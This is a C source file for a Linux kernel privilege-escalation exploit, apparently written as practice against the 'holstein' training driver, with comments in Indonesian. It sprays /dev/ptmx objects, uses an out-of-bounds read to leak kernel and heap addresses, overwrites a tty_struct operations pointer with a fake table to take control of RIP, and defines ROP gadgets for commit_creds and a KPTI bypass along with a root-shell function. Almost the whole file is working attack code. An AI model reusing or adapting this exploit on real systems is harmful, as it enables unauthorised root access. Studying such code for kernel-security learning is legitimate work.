#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define ofs_tty_ops 0xc38880
#define addr_commit_creds (kbase + 0x0744b0)
#define addr_prepare_kernel_cred (kbase + 0x074650)
#define rop_push_rdx_mov_ebp_415bffd9h_pop_rsp_r13_rbp (kbase + 0x3a478a)
#define rop_pop_rdi (kbase + 0x0d748d)
#define rop_pop_rcx (kbase + 0x13c1c4)
#define rop_mov_rdi_rax_rep_movsq (kbase + 0x62707b)
#define rop_bypass_kpti (kbase + 0x800e26)

unsigned long kbase, g_buf;
unsigned long user_cs, user_ss, user_rsp, user_rflags;
int fd;
void save_state()
{
	asm(
		".intel_syntax noprefix;"
		"mov user_cs, cs;"
		"mov user_ss, ss;"
		"mov user_rsp, rsp;"
		"pushf;"
		"pop user_rflags;"
		".att_syntax;"
	);
}

void win()
{
	const char *argv[] = {"/bin/sh",NULL};
	const char *envp[] = {NULL};
	puts("ROOOT");
	execve("/bin/sh",argv,envp); 
}

void leaked()
{
	int spray[100];
	unsigned long ops_tty,g_buf;

	for(int i=0; i < 50;i++){
		spray[i] = open("/dev/ptmx", O_RDONLY|O_NOCTTY);
		if(spray[i]==-1){
			perror("/dev/ptmx");
			exit(EXIT_FAILURE);
		}
	}
	fd = open("/dev/holstein",O_RDWR);
	for(int i=50; i < 100;i++){
		spray[i] = open("/dev/ptmx", O_RDONLY|O_NOCTTY);
		if(spray[i]==-1){
			perror("/dev/ptmx");
			exit(EXIT_FAILURE);
		}
	}
	char buff[0x500];
	memset(buff,'A',0x500);
	read(fd,buff,0x480);
	for(int i=0;i<0x480 / 8;i++){
		printf("leaked = 0x%016lx\n" ,*(unsigned long*)(buff + i * 8));
		if((*(unsigned long*)(buff + i * 8) & 0xfff) == 0x880){
			ops_tty = *(unsigned long*)(buff + i * 8);
			continue;
		}
		if((*(unsigned long*)(buff + i * 8) & 0xfff) == 0x438){
			g_buf = *(unsigned long*)(buff + i * 8) - 0x438;
			break;
		}
	}
	kbase = ops_tty - ofs_tty_ops;

	printf("[+] tty ops = 0x%016lx\n" ,ops_tty);
	printf("[+] kernel base = 0x%016lx\n" ,kbase);
	printf("[+] g_buf = 0x%016lx\n" ,g_buf);
	printf("[+] offset ajaib = 0x%016lx\n" ,*(unsigned long*)(buff + 0x400));
	printf("[+] heap chunk = 0x%016lx\n",g_buf + 0x400);

  //menulis fungsi table tty_ops palsu pada offset 0x418
  unsigned long *p = (unsigned long*)&buff;
  for(int i=0;i<0x40;i++){
    *p++ =  0xffffffffdead000 + (i << 8);
    printf("ptr-> 0x%016lx\n",*p);
  }
  *(unsigned long*)(buff+0x418) = g_buf;
  write(fd,buff,0x420);	
  //kendalikan RIP
  for(int i=0;i<100;i++){
    ioctl(spray[i],0xdeadbeef,0xdeadbabe);
  }

	close(fd);
	
}

int main()
{
	save_state();
	leaked();

	return EXIT_SUCCESS;
}